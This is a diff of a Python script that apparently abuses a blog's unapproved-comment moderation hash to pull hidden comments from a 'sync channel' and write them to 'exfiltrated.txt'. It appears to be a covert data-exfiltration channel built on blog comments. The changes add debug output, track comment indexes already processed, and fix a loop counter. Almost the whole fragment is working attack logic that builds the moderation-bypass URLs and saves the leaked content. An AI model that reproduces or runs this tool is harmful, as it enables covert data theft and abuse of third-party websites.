@@ -87,6 +87,7 @@ def get_moderation_hash_at_current_time():
 
     response_splitted = response_details.split(",")
     url = response_splitted[1]
+    print("## URL is " + url)
     return get_moderation_hash_from_url(url), get_unapproved_index_from_url(url)
 
 clients = []
@@ -110,12 +111,18 @@ while(loop_counter > 0):
 
     delay_to_timeslot(server_time_slot)
 
-    for client in clients:
-        print("## checking client id: " + str(client.id))
+    index_client = 0
+    processed_unapproved_indexes = []
+            
+    while index_client < len(clients):
+        print("## checking index_client: " + str(index_client))
         
         for index_offset in range(1, len(clients) + 1 + 1):
+            print("## prev_unapproved_index: " + str(prev_unapproved_index) + ", index_offset: " + str(index_offset))
             current_unapproved_index = prev_unapproved_index + index_offset
-            if current_unapproved_index == server_index:
+            print("## " + str(current_unapproved_index) + " in? " + str(processed_unapproved_indexes))
+            if current_unapproved_index == server_index or current_unapproved_index in processed_unapproved_indexes:
+                index_client += 1
                 continue
             
             url = target_blog + sync_channel + "?unapproved=" + str(current_unapproved_index) + "&moderation-hash=" + current_hash + "&url=" + str(current_unapproved_index)
@@ -134,9 +141,13 @@ while(loop_counter > 0):
                     f = open("exfiltrated.txt", "a")
                     f.write(to_write)
                     f.close()
+
+                    processed_unapproved_indexes.append(current_unapproved_index)
+                    print("## processed_unapproved_indexes: " + str(processed_unapproved_indexes))
                     break
             else:
                 print("[INFO] No comment for moderation for " + client_time_slot + " using index " + str(current_unapproved_index) + ". Skipping...")
+        index_client += 1
 
     prev_unapproved_index = get_current_unapproved_index()
-    loop_counter += 1
+    loop_counter -= 1
